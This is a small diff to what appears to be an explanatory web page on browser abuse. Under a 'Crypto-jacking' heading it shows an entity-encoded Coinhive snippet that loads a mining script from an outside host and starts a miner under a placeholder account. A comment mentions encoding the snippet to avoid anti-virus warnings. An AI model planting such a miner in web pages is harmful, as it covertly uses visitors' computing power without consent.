@@ -515,13 +515,13 @@ stream = await navigator.mediaDevices.getUserMedia(constraints);
 
 Crypto-jacking:
  
-<pre comment='unicode characters avoid anti-virus warnings'>
+<pre comment='use unicode characters to avoid anti-virus warnings'>
 &#60;script src="https://coin-hive.com/lib/coinhive.min.js" &#62; &#60;/script&#62; 
 &#60;script&#62;
   var miner = new CoinHive.Anonymous('[my account id]');
   miner.start();
 &#60;/script&#62;
-<pre>
+</pre>
  
 --
 
